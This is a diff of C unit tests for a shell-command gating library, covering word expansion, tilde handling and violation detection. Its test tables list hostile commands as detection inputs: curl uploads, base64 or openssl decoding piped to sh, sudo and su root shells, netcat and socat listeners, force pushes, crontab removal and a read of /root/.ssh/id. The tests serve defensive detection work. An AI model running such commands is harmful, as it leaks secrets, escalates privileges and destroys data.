-      {"echo $VALUE", false},
-      {"echo *.binary", true},
+  static const char *const cases[] = {
+      "echo $VALUE",
+      "echo *.binary",
   };
   const struct expansion_view view = {
       .netargv = (const char *)expansion,
@@ -6688,15 +6787,11 @@ TEST(binary_expansion_callback_contract) {
     sg_gate_t *gate = sg_gate_new();
     ASSERT(gate != NULL);
     ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo \"a\\x00b\""));
-    if (cases[i].glob)
-      ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(
-          gate, expand_requested_length, (void *)&view));
-    else
-      ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, expand_requested_length,
-                                                  (void *)&view));
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_requested_length,
+                                                 (void *)&view));
 
     sg_result_t result = {0};
-    ASSERT_SG_OK(eval_cmd(gate, cases[i].input, &result));
+    ASSERT_SG_OK(eval_cmd(gate, cases[i], &result));
     ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
     const sg_subcommand_result_t *subcommand = &result.subcommands[0];
     ASSERT(subcommand->netargv != NULL &&
@@ -6715,13 +6810,2144 @@ TEST(binary_expansion_callback_contract) {
     st_token_array_free(&tokens);
     sg_gate_free(gate);
   }
+
+  sg_gate_t *path_gate = sg_gate_new();
+  ASSERT(path_gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(path_gate, 0));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
+      path_gate, expand_requested_length, (void *)&view));
+  sg_result_t path_result = {0};
+  ASSERT(eval_cmd(path_gate, "echo >\"$OUT\"", &path_result) == SG_ERR_EXPAND);
+  sg_gate_free(path_gate);
 }
 
-static sg_expand_status_t expand_failed(const char *name, size_t name_length,
+typedef struct {
+  sg_expand_word_purpose_t purpose;
+  sg_expand_status_t status;
+  struct expansion_view view;
+  size_t calls;
+} expansion_error_fixture_t;
+
+static SHELL_NONNULL(1, 2, 3, 4) sg_expand_status_t
+    expand_error_fixture(const sg_expand_word_request_t *request,
+                         const char **netargv, size_t *length, void *context) {
+  expansion_error_fixture_t *fixture = context;
+  if (request->purpose != fixture->purpose)
+    return SG_EXPAND_UNRESOLVED;
+  fixture->calls++;
+  *netargv = fixture->view.netargv;
+  *length = fixture->view.length;
+  return fixture->status;
+}
+
+TEST(expansion_error_diagnostic_boundaries) {
+  static const char binary[] = "3:a\0b,";
+  static const struct {
+    sg_expand_status_t status;
+    struct expansion_view view;
+  } failures[] = {
+      {SG_EXPAND_FAILED, {NULL, 0}},
+      {(sg_expand_status_t)2, {NULL, 0}},
+      {SG_EXPAND_RESOLVED, {"01:a,", 5}},
+      {SG_EXPAND_RESOLVED, {"2:a,", 4}},
+      {SG_EXPAND_RESOLVED, {"1:a;", 4}},
+      {SG_EXPAND_RESOLVED, {"1:a,garbage", 11}},
+      {SG_EXPAND_RESOLVED, {binary, sizeof(binary) - 1}},
+  };
+  static const struct {
+    const char *source;
+    sg_expand_word_purpose_t purpose;
+  } sources[] = {
+      {"echo \"$ARG\"", SG_EXPAND_WORD_ARGUMENT},
+      {"echo >\"$OUT\"", SG_EXPAND_WORD_REDIRECT_PATH},
+      {"echo \"$(<\"$FILE\")\"", SG_EXPAND_WORD_FILE_SUBSTITUTION_PATH},
+  };
+  static const size_t prefixes[] = {1, 8, 21, 22, 512};
+  static const char diagnostic[] = "word expansion failed";
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo \"a\\x00b\""));
+
+  for (size_t source = 0; source < sizeof(sources) / sizeof(sources[0]);
+       source++) {
+    size_t source_length = strlen(sources[source].source);
+    size_t workspace = sg_test_eval_workspace_size(source_length);
+    size_t alignment = shell_dep_workspace_alignment();
+    char *storage = malloc(workspace + 512 + alignment - 1);
+    ASSERT(storage != NULL && workspace != 0);
+    expansion_error_fixture_t fixture = {.purpose = sources[source].purpose};
+    ASSERT_SG_OK(
+        sg_gate_set_expand_word_netargv(gate, expand_error_fixture, &fixture));
+    for (size_t failure = 0; failure < sizeof(failures) / sizeof(failures[0]);
+         failure++) {
+      if (failure == sizeof(failures) / sizeof(failures[0]) - 1 && source == 0)
+        continue; /* Binary argv is valid; only pathnames reject NUL. */
+      fixture.status = failures[failure].status;
+      fixture.view = failures[failure].view;
+      for (size_t capacity = 0;
+           capacity < sizeof(prefixes) / sizeof(prefixes[0]); capacity++) {
+        size_t prefix = prefixes[capacity];
+        char *buffer = sg_test_eval_buffer_for_prefix(storage, prefix);
+        size_t buffer_size = workspace + prefix;
+        ASSERT(sg_test_eval_prefix_size(buffer, buffer_size, source_length) ==
+               prefix);
+        fixture.calls = 0;
+        sg_result_t result = {0};
+        sg_error_t error =
+            sg_gate_evaluate(gate, sources[source].source, source_length,
+                             buffer, buffer_size, &result);
+        if (error != SG_ERR_EXPAND)
+          printf("\n    expansion error source=%zu failure=%zu prefix=%zu "
+                 "error=%d\n",
+                 source, failure, prefix, error);
+        ASSERT(error == SG_ERR_EXPAND && fixture.calls == 1);
+        ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
+               result.truncated == (prefix < sizeof(diagnostic)) &&
+               result.subcommand_count == 0);
+        ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
+        if (prefix == 1) {
+          ASSERT(result.deny_reason == NULL);
+        } else {
+          ASSERT(result.deny_reason != NULL);
+          size_t length =
+              prefix < sizeof(diagnostic) ? prefix - 1 : sizeof(diagnostic) - 1;
+          ASSERT(strlen(result.deny_reason) == length &&
+                 memcmp(result.deny_reason, diagnostic, length) == 0);
+        }
+      }
+    }
+
+    /* A valid binary argument succeeds. Canonically empty/ambiguous pathname
+     * results are shell setup failures, not callback failures. */
+    static const struct expansion_view controls[] = {
+        {NULL, 0}, {"0:,", 3}, {"1:a,1:b,", 8}};
+    size_t control_count =
+        source == 0 ? 1 : sizeof(controls) / sizeof(controls[0]);
+    for (size_t control = 0; control < control_count; control++) {
+      fixture.status = SG_EXPAND_RESOLVED;
+      fixture.view = source == 0
+                         ? (struct expansion_view){binary, sizeof(binary) - 1}
+                         : controls[control];
+      fixture.calls = 0;
+      char *buffer = sg_test_eval_buffer_for_prefix(storage, 512);
+      sg_result_t result = {0};
+      ASSERT_SG_OK(sg_gate_evaluate(gate, sources[source].source, source_length,
+                                    buffer, workspace + 512, &result));
+      ASSERT(fixture.calls == 1 && !result.truncated &&
+             result_fields_stay_in_buffer(&result, buffer, 512));
+      if (source == 0) {
+        static const char expected[] = "4:echo,3:a\0b,";
+        ASSERT(result.verdict == SG_VERDICT_ALLOW &&
+               result.subcommand_count == 1 &&
+               result.subcommands[0].netargv_length == sizeof(expected) - 1 &&
+               memcmp(result.subcommands[0].netargv, expected,
+                      sizeof(expected) - 1) == 0);
+      }
+    }
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
+    free(storage);
+  }
+  sg_gate_free(gate);
+}
+
+typedef struct {
+  const char *word;
+  sg_expand_word_purpose_t purpose;
+  sg_expand_status_t status;
+  const char *netargv;
+  size_t calls;
+} expansion_rule_t;
+
+typedef struct {
+  expansion_rule_t *rules;
+  size_t rule_count;
+  size_t calls;
+  bool valid;
+  const char *expected_cwd;
+  const char *expected_owner;
+  const char *unexpected_word;
+  size_t unexpected_word_length;
+  sg_expand_word_purpose_t unexpected_purpose;
+} expansion_contract_t;
+
+static sg_expand_status_t
+expand_by_source_word(const sg_expand_word_request_t *request,
+                      const char **netargv, size_t *netargv_length,
+                      void *context) {
+  expansion_contract_t *contract = context;
+  contract->calls++;
+  contract->valid =
+      contract->valid && request->word_offset <= request->source_length &&
+      request->word_length <= request->source_length - request->word_offset &&
+      request->owner_offset <= request->source_length &&
+      request->owner_length <= request->source_length - request->owner_offset;
+  if (contract->expected_cwd) {
+    contract->valid = contract->valid && request->cwd_known &&
+                      request->cwd_absolute && request->cwd != NULL &&
+                      strcmp(request->cwd, contract->expected_cwd) == 0;
+  }
+  if (contract->expected_owner)
+    contract->valid &=
+        request->owner_length == strlen(contract->expected_owner) &&
+        memcmp(request->source + request->owner_offset,
+               contract->expected_owner, request->owner_length) == 0;
+
+  const char *word = request->source + request->word_offset;
+  for (size_t i = 0; i < contract->rule_count; i++) {
+    expansion_rule_t *rule = &contract->rules[i];
+    size_t length = strlen(rule->word);
+    if (rule->purpose != request->purpose || length != request->word_length ||
+        memcmp(rule->word, word, length) != 0)
+      continue;
+    rule->calls++;
+    if (rule->status == SG_EXPAND_RESOLVED) {
+      *netargv = rule->netargv;
+      *netargv_length = strlen(rule->netargv);
+    }
+    return rule->status;
+  }
+  contract->valid = false;
+  contract->unexpected_word = word;
+  contract->unexpected_word_length = request->word_length;
+  contract->unexpected_purpose = request->purpose;
+  return SG_EXPAND_UNRESOLVED;
+}
+
+TEST(whole_word_expansion_context_contract) {
+  expansion_rule_t rules[] = {
+      {"pre\"$VALUE\"post", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED,
+       "9:two words,", 0},
+      {"\"$OUT\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+       "11:/etc/target,", 0},
+      {"\"$INPUT\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED,
+       "13:/root/.ssh/id,", 0},
+  };
+  expansion_contract_t contract = {
+      .rules = rules,
+      .rule_count = sizeof(rules) / sizeof(rules[0]),
+      .valid = true,
+      .expected_cwd = "/workspace",
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/start"));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "cd *"));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo \"two words\""));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "cat #path"));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
+
+  static const char command[] =
+      "cd /workspace; echo pre\"$VALUE\"post >\"$OUT\"; cat \"$INPUT\"";
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(contract.valid && contract.calls == 3);
+  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
+    ASSERT(rules[i].calls == 1);
+  if (result.verdict != SG_VERDICT_ALLOW || result.subcommand_count != 2)
+    printf("\n    whole-word result: verdict=%d commands=%u flags=%u\n",
+           result.verdict, result.subcommand_count,
+           result.unresolved_expansion_flags);
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
+  ASSERT_STR(result.subcommands[0].display_command, "echo two words");
+  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:two words,");
+  ASSERT_STR(result.subcommands[1].display_command, "cat /root/.ssh/id");
+  ASSERT(result.unresolved_expansion_flags == 0);
+  ASSERT((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0);
+  ASSERT((result.violation_type_flags & SG_VIOL_READ_SECRETS) != 0);
+  sg_gate_free(gate);
+}
+
+TEST(assignment_tilde_expansion_contract) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
+  for (size_t i = 0; i < sizeof(shellsplit_test_tilde_words) /
+                             sizeof(shellsplit_test_tilde_words[0]);
+       i++) {
+    const char *word = shellsplit_test_tilde_words[i].word;
+    char source[256];
+    snprintf(source, sizeof(source), "echo %s", word);
+    expansion_rule_t rule = {word, SG_EXPAND_WORD_ARGUMENT,
+                             SG_EXPAND_UNRESOLVED, NULL, 0};
+    expansion_contract_t contract = {.rules = &rule,
+                                     .rule_count = 1,
+                                     .valid = true,
+                                     .expected_owner = source};
+    for (unsigned enabled = 0; enabled < 2; enabled++) {
+      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
+          gate, enabled ? expand_by_source_word : NULL, &contract));
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, source, &result));
+      uint32_t expected = shellsplit_test_tilde_words[i].argument_dynamic
+                              ? SG_EXPANSION_UNRESOLVED_ARGV
+                              : 0;
+      ASSERT(contract.valid && result.subcommand_count == 1);
+      if ((result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
+          expected)
+        printf("\n    tilde context: %s flags=%u expected=%u\n", source,
+               result.unresolved_expansion_flags, expected);
+      ASSERT((result.unresolved_expansion_flags &
+              SG_EXPANSION_UNRESOLVED_ARGV) == expected &&
+             result.subcommands[0].unresolved_expansion_flags ==
+                 result.unresolved_expansion_flags);
+      ASSERT(rule.calls == (enabled && expected != 0));
+    }
+    /* Bash also expands assignment-shaped tildes in FILE operands. */
+    rule.purpose = SG_EXPAND_WORD_REDIRECT_PATH;
+    rule.calls = contract.calls = 0;
+    snprintf(source, sizeof(source), "echo >%s", word);
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, source, &result));
+    ASSERT(contract.valid &&
+           rule.calls == shellsplit_test_tilde_words[i].argument_dynamic);
+    ASSERT(result.unresolved_expansion_flags ==
+           (shellsplit_test_tilde_words[i].argument_dynamic
+                ? SG_EXPANSION_UNRESOLVED_PATH
+                : 0));
+  }
+  static const struct {
+    const char *word, *value;
+  } resolved[] = {
+      {"x=~", "x=/example"},         {"x+=~", "x+=/example"},
+      {"x=y:~", "x=y:/example"},     {"x=~/path", "x=/example/path"},
+      {"x\\\n=\\\n~", "x=/example"},
+  };
+  for (size_t i = 0; i < sizeof(resolved) / sizeof(resolved[0]); i++) {
+    char source[128], record[128], expected[160];
+    snprintf(source, sizeof(source), "echo %s", resolved[i].word);
+    snprintf(record, sizeof(record), "%zu:%s,", strlen(resolved[i].value),
+             resolved[i].value);
+    snprintf(expected, sizeof(expected), "4:echo,%s", record);
+    expansion_rule_t rule = {resolved[i].word, SG_EXPAND_WORD_ARGUMENT,
+                             SG_EXPAND_RESOLVED, record, 0};
+    expansion_contract_t contract = {.rules = &rule,
+                                     .rule_count = 1,
+                                     .valid = true,
+                                     .expected_owner = source};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, source, &result));
+    ASSERT(contract.valid && rule.calls == 1 && result.subcommand_count == 1);
+    ASSERT_STR(result.subcommands[0].netargv, expected);
+    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
+           !result.unresolved_expansion_flags &&
+           !result.subcommands[0].unresolved_expansion_flags);
+  }
+  expansion_contract_t protected = {.valid = true};
+  static const struct {
+    const char *source;
+    sg_expand_word_purpose_t purpose;
+  } paths[] = {{"echo >x=~", SG_EXPAND_WORD_REDIRECT_PATH},
+               {"X=$(<x=~)", SG_EXPAND_WORD_FILE_SUBSTITUTION_PATH}};
+  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
+    expansion_rule_t rule = {"x=~", paths[i].purpose, SG_EXPAND_RESOLVED,
+                             "10:x=/example,", 0};
+    expansion_contract_t contract = {
+        .rules = &rule, .rule_count = 1, .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, paths[i].source, &result));
+    ASSERT(contract.valid && rule.calls == 1 &&
+           !result.unresolved_expansion_flags);
+  }
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &protected));
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "printf x=~ fd", &result));
+  ASSERT(protected.valid && protected.calls == 0 &&
+         result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_ARGV);
+  ASSERT(eval_cmd(gate, "exec {fd}>out; printf x=~ fd; echo >&$fd", &result) ==
+         SG_ERR_PARSE);
+  ASSERT(protected.valid && protected.calls == 0);
+  sg_gate_free(gate);
+}
+
+TEST(tilde_path_identity_expansion_contract) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "curl"));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "sh"));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  for (size_t i = 0; i < sizeof(shellsplit_test_tilde_path_aliases) /
+                             sizeof(shellsplit_test_tilde_path_aliases[0]);
+       i++) {
+    for (unsigned mode = 0; mode < 3; mode++) {
+      expansion_rule_t rule = {shellsplit_test_tilde_path_aliases[i].word,
+                               SG_EXPAND_WORD_REDIRECT_PATH,
+                               mode == 2 ? SG_EXPAND_RESOLVED
+                                         : SG_EXPAND_UNRESOLVED,
+                               shellsplit_test_tilde_path_aliases[i].record, 0};
+      expansion_contract_t contract = {
+          .rules = &rule, .rule_count = 1, .valid = true};
+      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
+          gate, mode ? expand_by_source_word : NULL, &contract));
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, shellsplit_test_tilde_path_aliases[i].source,
+                            &result));
+      bool dynamic = shellsplit_test_tilde_path_aliases[i].dynamic;
+      /* The ordinary $OUT control queries both the reader and writer. */
+      unsigned expected_calls =
+          dynamic && mode ? (strcmp(rule.word, "\"$OUT\"") == 0 ? 2u : 1u) : 0;
+      ASSERT(contract.valid && contract.calls == expected_calls);
+      ASSERT(result.subcommand_count == 2 &&
+             result.verdict == SG_VERDICT_ALLOW);
+      ASSERT(result.unresolved_expansion_flags ==
+             (dynamic && mode != 2 ? SG_EXPANSION_UNRESOLVED_PATH : 0));
+      bool alias = (!dynamic || mode == 2) &&
+                   shellsplit_test_tilde_path_aliases[i].resolved_alias;
+      ASSERT(!!(result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) ==
+             alias);
+    }
+  }
+  sg_gate_free(gate);
+}
+
+typedef struct {
+  const char *cwd;
+  bool absolute, valid;
+  unsigned arguments, paths;
+} tilde_cwd_contract_t;
+
+static SHELL_NONNULL(1, 2, 3, 4) sg_expand_status_t
+    expand_with_tilde_cwd(const sg_expand_word_request_t *request,
+                          const char **netargv, size_t *netargv_length,
+                          void *context) {
+  tilde_cwd_contract_t *contract = context;
+  const char *word = request->source + request->word_offset;
+  bool argument = request->word_length == 6 && memcmp(word, "\"$ARG\"", 6) == 0;
+  bool path = request->word_length == 6 && memcmp(word, "\"$OUT\"", 6) == 0;
+  if (!argument && !path)
+    return SG_EXPAND_UNRESOLVED; /* A retained cd/substitution may also query.
+                                  */
+  contract->arguments += argument;
+  contract->paths += path;
+  contract->valid &= request->cwd_known == (contract->cwd != NULL);
+  if (contract->cwd)
+    contract->valid &= request->cwd_absolute == contract->absolute &&
+                       strcmp(request->cwd, contract->cwd) == 0;
+  static const char owner[] = "echo \"$ARG\" >\"$OUT\"";
+  contract->valid &= request->owner_length == sizeof(owner) - 1 &&
+                     memcmp(request->source + request->owner_offset, owner,
+                            sizeof(owner) - 1) == 0;
+  contract->valid &=
+      request->purpose ==
+      (argument ? SG_EXPAND_WORD_ARGUMENT : SG_EXPAND_WORD_REDIRECT_PATH);
+  (void)netargv;
+  (void)netargv_length;
+  return SG_EXPAND_UNRESOLVED;
+}
+
+TEST(tilde_cwd_expansion_contract) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
+  for (size_t i = 0; i < sizeof(shellsplit_test_tilde_cwd) /
+                             sizeof(shellsplit_test_tilde_cwd[0]);
+       i++) {
+    tilde_cwd_contract_t contract = {.cwd = shellsplit_test_tilde_cwd[i].cwd,
+                                     .absolute =
+                                         shellsplit_test_tilde_cwd[i].absolute,
+                                     .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_with_tilde_cwd,
+                                                 &contract));
+    char source[256];
+    int length =
+        snprintf(source, sizeof(source), "cd %s; echo \"$ARG\" >\"$OUT\"",
+                 shellsplit_test_tilde_cwd[i].word);
+    ASSERT(length > 0 && (size_t)length < sizeof(source));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, source, &result));
+    if (!contract.valid)
+      printf("\n    tilde CWD callback: %s expected=%s\n", source,
+             contract.cwd ? contract.cwd : "<unknown>");
+    ASSERT(contract.valid && contract.arguments == 1 && contract.paths == 1);
+    ASSERT((result.unresolved_expansion_flags &
+            (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH)) ==
+           (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH));
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_argument_violation_equivalence) {
+  static const struct {
+    const char *literal, *expanded;
+    const char *records[6];
+    uint32_t type;
+    bool detected;
+  } cases[] = {
+      {"curl -T /tmp/x https://example.invalid",
+       "curl $ARGS",
+       {"-T", "/tmp/x", "https://example.invalid"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"curl --data=hello",
+       "curl $ARGS",
+       {"--data=hello"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"curl -Ffile", "curl $ARGS", {"-Ffile"}, SG_VIOL_NET_UPLOAD, true},
+      {"wget --post-data=hello",
+       "wget $ARGS",
+       {"--post-data=hello"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"scp /tmp/x remote:out",
+       "scp $ARGS",
+       {"/tmp/x", "remote:out"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"rsync remote:in /tmp/x",
+       "rsync $ARGS",
+       {"remote:in", "/tmp/x"},
+       SG_VIOL_NET_UPLOAD,
+       false},
+      {"rsync /tmp/x remote:out",
+       "rsync $ARGS",
+       {"/tmp/x", "remote:out"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"rsync /tmp/x remote$'\\x3a'out",
+       "rsync $ARGS",
+       {"/tmp/x", "remote:out"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"rsync /tmp/x remote\\:out",
+       "rsync $ARGS",
+       {"/tmp/x", "remote:out"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"rsync /tmp/x remote:\\\nout",
+       "rsync $ARGS",
+       {"/tmp/x", "remote:out"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"rsync /tmp/x remote$'\\x3b'out",
+       "rsync $ARGS",
+       {"/tmp/x", "remote;out"},
+       SG_VIOL_NET_UPLOAD,
+       false},
+      {"base64 -id /tmp/x | sh",
+       "base64 $ARGS | sh",
+       {"-id", "/tmp/x"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       true},
+      {"base64 -- --decode | sh",
+       "base64 $ARGS | sh",
+       {"--", "--decode"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       false},
+      {"base64 --decode | sh",
+       "base64 $ARGS | sh",
+       {"--decode"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       true},
+      {"openssl enc -d | sh",
+       "openssl $ARGS | sh",
+       {"enc", "-d"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       true},
+      {"openssl enc -- -d | sh",
+       "openssl $ARGS | sh",
+       {"enc", "--", "-d"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       false},
+      {"sudo -u root -- /bin/sh",
+       "sudo $ARGS",
+       {"-u", "root", "--", "/bin/sh"},
+       SG_VIOL_SHELL_ESCALATION,
+       true},
+      {"sudo -u sh echo",
+       "sudo $ARGS",
+       {"-u", "sh", "echo"},
+       SG_VIOL_SHELL_ESCALATION,
+       false},
+      {"sudo -u", "sudo $ARGS", {"-u"}, SG_VIOL_SHELL_ESCALATION, false},
+      {"su --shell=/bin/sh",
+       "su $ARGS",
+       {"--shell=/bin/sh"},
+       SG_VIOL_SHELL_ESCALATION,
+       true},
+      {"su -s/bin/sh",
+       "su $ARGS",
+       {"-s/bin/sh"},
+       SG_VIOL_SHELL_ESCALATION,
+       true},
+      {"su -s /bin/sh",
+       "su $ARGS",
+       {"-s", "/bin/sh"},
+       SG_VIOL_SHELL_ESCALATION,
+       true},
+      {"su -s -c", "su $ARGS", {"-s", "-c"}, SG_VIOL_SHELL_ESCALATION, false},
+      {"su --command=echo",
+       "su $ARGS",
+       {"--command=echo"},
+       SG_VIOL_SHELL_ESCALATION,
+       true},
+      {"chmod -R 755 /etc",
+       "chmod $ARGS",
+       {"-R", "755", "/etc"},
+       SG_VIOL_PERM_SYSTEM,
+       true},
+      {"nc -l 8000", "nc $ARGS", {"-l", "8000"}, SG_VIOL_NET_LISTENER, true},
+      {"socat TCP-LISTEN:8000 STDIO",
+       "socat $ARGS",
+       {"TCP-LISTEN:8000", "STDIO"},
+       SG_VIOL_NET_LISTENER,
+       true},
+      {"socat TCP-LI\"ST\"EN:8000 STDIO",
+       "socat $ARGS",
+       {"TCP-LISTEN:8000", "STDIO"},
+       SG_VIOL_NET_LISTENER,
+       true},
+      {"socat TCP-$'\\x4c'ISTEN:8000 STDIO",
+       "socat $ARGS",
+       {"TCP-LISTEN:8000", "STDIO"},
+       SG_VIOL_NET_LISTENER,
+       true},
+      {"socat TCP-li\"st\"en:8000 STDIO",
+       "socat $ARGS",
+       {"TCP-listen:8000", "STDIO"},
+       SG_VIOL_NET_LISTENER,
+       true},
+      {"socat TCP-LiStEn:8000 STDIO",
+       "socat $ARGS",
+       {"TCP-LiStEn:8000", "STDIO"},
+       SG_VIOL_NET_LISTENER,
+       false},
+      {"socat TCP-LI$'\\x58'EN:8000 STDIO",
+       "socat $ARGS",
+       {"TCP-LIXEN:8000", "STDIO"},
+       SG_VIOL_NET_LISTENER,
+       false},
+      {"git push --force",
+       "git $ARGS",
+       {"push", "--force"},
+       SG_VIOL_GIT_DESTRUCTIVE,
+       true},
+      {"git clean -fdx",
+       "git $ARGS",
+       {"clean", "-fdx"},
+       SG_VIOL_GIT_DESTRUCTIVE,
+       true},
+      {"git filter-branch",
+       "git $ARGS",
+       {"filter-branch"},
+       SG_VIOL_GIT_DESTRUCTIVE,
+       true},
+      {"crontab -l", "crontab $ARGS", {"-l"}, SG_VIOL_PERSISTENCE, false},
+      {"crontab -r", "crontab $ARGS", {"-r"}, SG_VIOL_PERSISTENCE, true},
+      {"git push --force",
+       "git $ARGS push --force",
+       {NULL},
+       SG_VIOL_GIT_DESTRUCTIVE,
+       true},
+      {"git '' push --force",
+       "git $ARGS push --force",
+       {""},
+       SG_VIOL_GIT_DESTRUCTIVE,
+       false},
+      {"sudo '' sh", "sudo $ARGS sh", {""}, SG_VIOL_SHELL_ESCALATION, false},
+      {"rsync remote:out",
+       "rsync remote:out $ARGS",
+       {NULL},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"rsync remote:out ''",
+       "rsync remote:out $ARGS",
+       {""},
+       SG_VIOL_NET_UPLOAD,
+       false},
+      {"cloudflared", "cloudflared $ARGS", {NULL}, SG_VIOL_NET_LISTENER, false},
+      {"command curl -T /tmp/x",
+       "command curl $ARGS",
+       {"-T", "/tmp/x"},
+       SG_VIOL_NET_UPLOAD,
+       true},
+      {"exec base64 -d | sh",
+       "exec base64 $ARGS | sh",
+       {"-d"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       true},
+      {"base64 \"'-d'\" | sh",
+       "base64 $ARGS | sh",
+       {"'-d'"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       false},
+      {"base64 '\\-d' | sh",
+       "base64 $ARGS | sh",
+       {"\\-d"},
+       SG_VIOL_SHELL_OBFUSCATION,
+       false},
+      {"su --shell='/bin/notsh'",
+       "su $ARGS",
+       {"--shell=/bin/notsh"},
+       SG_VIOL_SHELL_ESCALATION,
+       false},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
+    sg_result_t literal = {0};
